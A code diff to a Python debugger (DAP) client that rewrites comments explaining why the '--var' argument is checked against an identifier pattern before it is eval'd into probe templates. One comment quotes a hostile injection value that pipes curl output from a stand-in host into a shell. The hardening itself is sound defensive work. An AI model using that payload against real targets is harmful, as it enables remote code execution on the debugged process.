@@ -120,8 +120,7 @@ class DapClient:
         # clean EOF / peer close) the cause is recorded here so that
         # waiters can surface it instead of the generic "DAP connection
         # closed" message. None means "closed cleanly or still open".
-        # Per audit issue
-        # ``topo-lang-python-dapclient-reader-thread-swallows-exceptions``.
+        # so the reader thread never silently swallows the exception.
         self._fail_reason: str | None = None
         self._lock = threading.Lock()
         self._cv = threading.Condition(self._lock)
@@ -395,10 +394,9 @@ def fetch_bytes_and_layout(dap: DapClient, frame_id: int, var: str
     that callers translate to exit-code 4.
     """
     # Defence-in-depth: parse_args() already rejects non-identifier
-    # ``--var`` entries (audit issue
-    # ``topo-lang-python-pdb-and-bridge-probe-expression-injection``),
-    # but this function is also called from test harnesses that may
-    # construct ``var`` programmatically.
+    # ``--var`` entries (which would otherwise be eval'd into a
+    # target-side probe template), but this function is also called
+    # from test harnesses that may construct ``var`` programmatically.
     import re as _re
     if not (isinstance(var, str) and _re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", var)):
         raise ValueError(
@@ -534,8 +532,8 @@ def try_stdlib_bridge_summary(dap: "DapClient", frame_id: int, var: str
     stdlib-bridge-shaped host value; None otherwise (caller falls back to
     the numeric byte path)."""
     # Defence-in-depth identifier check; sibling fetch_bytes_and_layout
-    # carries the same one. Audit issue
-    # ``topo-lang-python-pdb-and-bridge-probe-expression-injection``.
+    # carries the same one. Guards against a hostile var name being
+    # eval'd into the target-side bridge probe template.
     import re as _re
     if not (isinstance(var, str) and _re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", var)):
         return None
@@ -607,13 +605,13 @@ def main(argv: list[str]) -> int:
     if not var_names:
         return die_usage("--var list is empty")
 
-    # Audit issue topo-lang-python-pdb-and-bridge-probe-expression-injection:
+    # Expression-injection hardening:
     # ``--var`` flows into ``_PROBE.format(var=v)`` / ``_BRIDGE_PROBE.format``
     # / ``f"type({var})"`` and the resulting string is eval'd inside the
     # target process. A hostile value such as
     # ``__import__('os').system('curl evil/sh | sh')#`` executes that
-    # expression on the target. Per principle
-    # ``input-validation-at-system-boundary`` the CLI must reject any
+    # expression on the target. Validating input at the system
+    # boundary, the CLI must reject any
     # ``--var`` that is not a Python identifier (ASCII subset) BEFORE
     # composing any probe. The gate runs before the target-path probe
     # so the EXIT_USAGE contract is uniform regardless of whether the
